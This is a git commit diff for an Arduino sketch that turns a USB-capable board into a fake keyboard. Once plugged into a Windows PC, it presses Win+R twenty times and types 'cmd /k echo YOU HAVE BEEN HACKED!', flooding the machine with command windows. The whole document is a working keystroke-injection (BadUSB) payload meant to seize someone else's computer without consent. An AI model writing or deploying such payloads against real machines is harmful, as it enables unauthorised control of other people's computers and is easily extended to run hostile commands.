751ee88653fa91bbab30103ae6b9e6b412e016a9
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-01-31 11:35:17 +0330

    Update flood_cmd_windows.ino

--- sketches/flood_cmd_windows.ino
+++ sketches/flood_cmd_windows.ino
@@ -1,17 +1,18 @@
-#include "Arduino.h"
-#include "USB.h"
-#include "USBHIDKeyboard.h"
-
+#include <USBHIDKeyboard.h>
 USBHIDKeyboard Keyboard;
 
 void setup() {
-    USB.begin();
-    Keyboard.begin();
-    delay(2000);
-    for (int i = 0; i < 10; i++) {
-        Keyboard.println("cmd /k");
-        delay(500);
-    }
+  Keyboard.begin();
+  delay(3000);
+  
+  for(int i=0; i<20; i++){
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    Keyboard.releaseAll();
+    delay(300);
+    Keyboard.println("cmd /k echo YOU HAVE BEEN HACKED!");
+    delay(300);
+  }
 }
 
 void loop() {}
